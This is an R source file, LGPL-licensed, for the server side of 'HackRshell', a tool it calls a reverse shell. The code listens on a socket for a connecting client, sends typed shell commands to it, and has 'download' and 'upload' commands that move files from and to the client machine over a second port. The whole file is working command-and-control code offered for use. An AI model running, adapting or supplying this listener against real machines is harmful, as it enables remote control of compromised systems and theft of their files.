    # HackRshell, an R reverse shell program - server side function.
    # Copyright (C) 2022 Ian Roberts

    # This library is free software; you can redistribute it and/or
    # modify it under the terms of the GNU Lesser General Public
    # License as published by the Free Software Foundation; either
    # version 2.1 of the License, or (at your option) any later version.

    # This library is distributed in the hope that it will be useful,
    # but WITHOUT ANY WARRANTY; without even the implied warranty of
    # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
    # Lesser General Public License for more details.

    # You should have received a copy of the GNU Lesser General Public
    # License along with this library; if not, write to the Free Software
    # Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA


server <- function(host="localhost", port=4471, secondaryPort=5472) {
  socket <- socketConnection(host=host, port=port, blocking=TRUE, server=TRUE, encoding="utf-8", timeout=300, open="r+")
  #Ensures the sockets get closed
  on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))

  fromClient <- readLines(socket, 1)
  exiting <- FALSE
  while(!exiting) {
    cat(fromClient)
    command <- readline(prompt="Shell> ")
    if (!is.na(command)) {
      writeLines(command, socket)
      firstWord <- strsplit(command, " ", fixed=TRUE)[[1]][1]

      if (firstWord == "exit") {
        exiting <- TRUE
      }

      else if (firstWord == "download") {
        abortDownload <- FALSE
        fileSize <- as.integer(readLines(socket, 1))
        fileName <- substring(command, 10)
        fileData <- tryCatch({
          if (fileSize < 0) {
            signalCondition(simpleError("Download Aborted by Client"))
          }
          fileSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=TRUE, timeout=300, open="rb")
          readBin(fileSocket, "raw", n=fileSize)
        }, error=function(e){
          abortDownload <- TRUE
          print(paste("Server error receiving file data: ", e$message))
        }, finally=function() {
          close(fileSocket)
        })

        if (!abortDownload) {
          tryCatch({
            outFile = file(fileName, "wb")
            writeBin(as.raw(fileData), outFile, size=1)
          }, error=function(e){
            print(paste("Error writing received data: ", e$message))
          }, finally=function() {
            close(outFile)
          })
        }
      }

      else if (firstWord == "upload") {
        fileName <- substring(command, 8)
        abortUpload <- FALSE
        fileSize <- 0
        fileData <- tryCatch({
          if (!file.exists(fileName)) {
            signalCondition(simpleError("File not found"))
          }
          fileSize <- as.integer(file.info(fileName, extra_cols=FALSE)$size)
          #Slight overestimate to compensate for floating point rounding error.
          #File size is saved as a float in file.info.
          if (fileSize*1.01 >= 2^31) {
            signalCondition(simpleError("File too large to send"))
          }
          targetFile <- file(fileName, "rb")
          readBin(targetFile, what="raw", n=(fileSize*1.01))
        }, error=function(e){
          print(paste("Error loading file: ", e$message))
          writeLines("-1", socket)
          abortUpload <- TRUE
        }, finally=function(){
          close(targetFile)
        })

        if(!abortUpload) {
          writeLines(toString(fileSize), socket)
          tryCatch({
            uploadSocket <- socketConnection(host=host, port=secondaryPort, blocking=FALSE, server=TRUE, timeout=300, open="wb")
            writeBin(fileData, uploadSocket, size=1)
            print("File sent!")
          }, error=function(e){
            print(paste("Error uploading file to client: ", e$message))
          }, finally=function(){
            close(uploadSocket)
          })
        }
      }
    }

    if (!exiting) {
      fromClient <- readLines(socket, 1)
      fromClient <- gsub("%&%", "\n", fixed=TRUE, fromClient)
    }
  }
  close(socket)
  print("Socket closed")
}

server()

